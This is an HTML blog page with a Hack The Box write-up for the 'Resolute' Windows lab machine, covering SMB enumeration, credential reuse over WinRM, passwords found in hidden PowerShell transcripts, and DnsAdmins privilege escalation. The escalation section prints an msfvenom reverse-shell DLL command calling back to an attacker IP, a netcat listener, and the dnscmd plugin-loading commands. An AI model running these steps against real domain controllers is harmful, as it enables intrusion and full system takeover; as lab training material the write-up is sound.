@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Vasu Sethia ">
+<meta name="description" content="SUMMARY: This is a medium windows box and has 30 points.The key to this machine is to keep your eye open while enumerating SMB to get access to the user melanie and then looking at the hidden directories and files to get the credentials of the user ryan and finally abusing DNSAdmin group privileges to get NT Authority .
+ENUMERATION: As Always we will start with nmap to scan for TCP ports and Services" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="/htb/resolute/" />
+
+
+    <title>
+        
+            Resolute Hack the Box (10.10.10.169) :: pwnshell  — Hello Friend NG Theme
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.154a87e0ff720e102948892a8eb80881aa81a4faf37376f3093be219f6296c3d.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+
+
+<meta itemprop="name" content="Resolute Hack the Box (10.10.10.169)">
+<meta itemprop="description" content="SUMMARY: This is a medium windows box and has 30 points.The key to this machine is to keep your eye open while enumerating SMB to get access to the user melanie and then looking at the hidden directories and files to get the credentials of the user ryan and finally abusing DNSAdmin group privileges to get NT Authority .
+ENUMERATION: As Always we will start with nmap to scan for TCP ports and Services">
+<meta itemprop="datePublished" content="2020-05-29T16:54:49&#43;05:30" />
+<meta itemprop="dateModified" content="2020-05-29T16:54:49&#43;05:30" />
+<meta itemprop="wordCount" content="1042">
+<meta itemprop="image" content="/"/>
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/"/>
+
+<meta name="twitter:title" content="Resolute Hack the Box (10.10.10.169)"/>
+<meta name="twitter:description" content="SUMMARY: This is a medium windows box and has 30 points.The key to this machine is to keep your eye open while enumerating SMB to get access to the user melanie and then looking at the hidden directories and files to get the credentials of the user ryan and finally abusing DNSAdmin group privileges to get NT Authority .
+ENUMERATION: As Always we will start with nmap to scan for TCP ports and Services"/>
+
+
+
+    <meta property="og:title" content="Resolute Hack the Box (10.10.10.169)" />
+<meta property="og:description" content="SUMMARY: This is a medium windows box and has 30 points.The key to this machine is to keep your eye open while enumerating SMB to get access to the user melanie and then looking at the hidden directories and files to get the credentials of the user ryan and finally abusing DNSAdmin group privileges to get NT Authority .
+ENUMERATION: As Always we will start with nmap to scan for TCP ports and Services" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/htb/resolute/" />
+<meta property="og:image" content="/"/>
+<meta property="article:published_time" content="2020-05-29T16:54:49+05:30" />
+<meta property="article:modified_time" content="2020-05-29T16:54:49+05:30" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-05-29 16:54:49 &#43;0530 IST" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ root &amp; NT Authority\System</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/htb/">Hack The Box</a></li><li><a href="/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="/htb/resolute/">Resolute Hack the Box (10.10.10.169)</a></h2>
+
+            
+
+            <div class="post-content">
+                <p><img src="/img/resolute.png" alt="Resolute"></p>
+<h2 id="summary">SUMMARY:</h2>
+<p>This is a medium windows box and has 30 points.The key to this machine is to keep your eye open while enumerating SMB to get access to the user melanie and then looking at the hidden directories and files to get the credentials of the user ryan and finally abusing DNSAdmin group privileges to get NT Authority .</p>
+<h2 id="enumeration">ENUMERATION:</h2>
+<p>As Always we will start with nmap to scan for TCP ports and Services</p>
+<p>#nmap -sC -sV -oA 10.10.10.169 where ,</p>
+<p>-sC: run default nmap scripts<br>
+-sV: detect service version<br>
+We get the following output</p>
+<p><img src="/img/nmap.png" alt=""></p>
+<ul>
+<li>Port 53: running</li>
+<li>Port 88: running Kerberos</li>
+<li>Ports 135, 593  running msrpc</li>
+<li>Ports 139 &amp; 445: running SMB</li>
+<li>Port 389 &amp; 3268: running Active Directory LDAP</li>
+<li>Port 464: running kpasswd5. This port is used for changing/setting passwords against Active Directory</li>
+<li>Ports 636 &amp; 3269: As indicated on the nmap FAQ page, this means that the port is protected by tcpwrapper, which is a host-based network access control program</li>
+</ul>
+<p>Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all the bases.
+Let’s run an nmap scan that covers all ports.</p>
+<p>#nmap -sC -sV -p- 10.10.10.169</p>
+<p>We get the following output:<br>
+<img src="/img/nmap2.png" alt=""><br>
+As you can see we few more ports running msrpc with port 47001 running windows remote management</p>
+<h2 id="enum4linux">Enum4Linux</h2>
+<p>enum4linux is a tool for enumerating information from Windows and Samba systems.It is written in Perl and is basically a wrapper around the Samba tools smbclient, rpclient, net and nmblookup.We begin our enumeration using the following command.</p>
+<p>#enum4linux 10.10.10.169
+Observe the output of the above command carefully as you might miss the juicy information .So let’s look at the output of the above command. If we carefully look at the output of enum4linux under the section “Users on 10.10.10.169” we can see that for the Account marko and Name Marko Novak, the Password is set to Welcome123! In the Desc .</p>
+<p><img src="/img/enum4linx.png" alt=""><br>
+<img src="/img/enum4linux2.png" alt=""></p>
+<h2 id="using-win-rm-">USING WIN-RM :</h2>
+<p>So let’s just use evil-rm to login as marcus with password Welcome123! .WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.You can get evil-rm from it’s github link <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a>.
+When I tried to login as marcus user, I got authentication failure so I tried these credentials against every user we obtained from our enum4linux output.You can check the creds using smbmap for every user .If the smbmap returns &ldquo;access denied&rdquo; then the credentials are wrong else they are good to go.I was successfully able to login as melanie user with the password as Welcome123! using  winrm.We can then get the user.txt in Desktop folder of the user melanie.<br>
+<img src="/img/evil-winrm2.png" alt=""></p>
+<h2 id="enumerate-again-">Enumerate Again :</h2>
+<p>Once I logged in I start enumerating what privileges melanie user has using the following command<br>
+&gt; net user /melanie<br>
+I couldn’t find anything that would lead me to escalate privileges and started poking around the files in the C:\ Directory and to my surprise I found a hidden directory PSTranscripts.I used powershell cmdlet to get the hidden files and folder inside the C:\<br>
+&gt; Get-ChildItem -Force<br>
+This shows all the folders and the hidden folders inside the C:\ .<br>
+<img src="/img/melanie.png" alt=""><br>
+After poking around , I enumerated PSTranscripts and found there is another hidden folder 20191203 but this time I used cmd command dir -force to list the hidden files and folders<br>
+<img src="/img/melanie5.png" alt=""><br>
+Looking inside of it, I saw another hidden file and looked at it.<br>
+<img src="/img/melanie6.png" alt=""><br>
+Let&rsquo;s look at what is inside this file.After looking what is inside of the file I find some credentials for user ryan.<br>
+<img src="/img/melanie7.png" alt=""><br>
+If you look at the 3rd line and the last of the above output you can interpret that Serv3r4Admin4cc123! Is the credentials for the user ryan .Exiting our melanie session in evil win-rm to  login as user ryan using evil-rm .</p>
+<h1 id="privilege-escalation">PRIVILEGE ESCALATION:</h1>
+<p>Now once we have logged in as user ryan let’s start enumerating again.We can begin the process of enumeration using <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winPEAS</a> but I first decided to check what all privileges and groups user ryan belong to .Using whoami /all shows all the privileges user ryan has . Below shows the command and the output of the command.<br>
+PS&gt; whoami /all<br>
+<img src="/img/ryan1.png" alt=""><br>
+<img src="/img/ryan2.png" alt=""></p>
+<h1 id="exploitation-of-dnsadmins-group">EXPLOITATION OF DNSADMINS GROUP:</h1>
+<p>As you can see that user ryan belongs to the group DnsAdmins .According to this <a href="https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/">article</a>, we can escalate our privileges. So following are the steps I did to escalate our privileges.
+Make dll using msfvenom to send us back the reverse shell , check your tun0 ip using ifconfig command .The following command is used to generate the payload using msfvenom</p>
+<p>#msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8    LPORT=443 &ndash;platform=windows -f dll<br>
+Now we have to transfer the dll to the target machine. We can serve it using the SMB server as shown in the article.So let’s use impacket smb server to server this dll .<br>
+#cd /usr/share/python-impacket/examples/<br>
+#python smbserver.py SHARE PATH_TO_OUR DLL</p>
+<p>We can check our smbserver is working correctly or not using net view command</p>
+<p>PS&gt; net view \10.10.14.8<br>
+The below we can see that as soon as we execute the above command our smbserver gets the request .So we can conclude that our smbserver is responding and working correctly , we can move further exploiting.<br>
+<img src="/img/ryan6.png" alt=""><br>
+Let’s set up our netcat listener to listen on port 443<br>
+#nc  -nvlp 443</p>
+<p>Once our netcat listener is listening on the port 443 let’s transfer the malicious dll on to the target machine and import that dll as a plugin using the following command</p>
+<p>PS&gt; dnscmd.exe resolute.megabank.local /config /serverlevelplugindll \10.10.14.8\share\plugin.dll</p>
+<p>The below shows the output of the above command .<br>
+<img src="/img/dnsadmin1.png" alt="">
+Now we have to reload the dns service to load that plugin .To do that we can use sc.exe to stop and start the dns service .The following two commands were used to stop and start the service.</p>
+<p>PS&gt; sc.exe stop dns<br>
+PS&gt; sc.exe start dns<br>
+<img src="/img/dnsadmin2.png" alt="">
+Once the above commands are executed we can see that our smbserver gets the request for the malicious dll and after a few seconds we get a reverse shell on our netcat listener.We can then grab the root.txt<br>
+<img src="/img/dnsadmin3.png" alt=""><br>
+<img src="/img/root.png" alt=""></p>
+<h2 id="thank-you-for-reading-this-post">Thank you for reading this post</h2>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+                <span><a href="/">Vasu Sethia</a></span>
+            
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span> <a href="/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+
+
+
+    </body>
+</html>
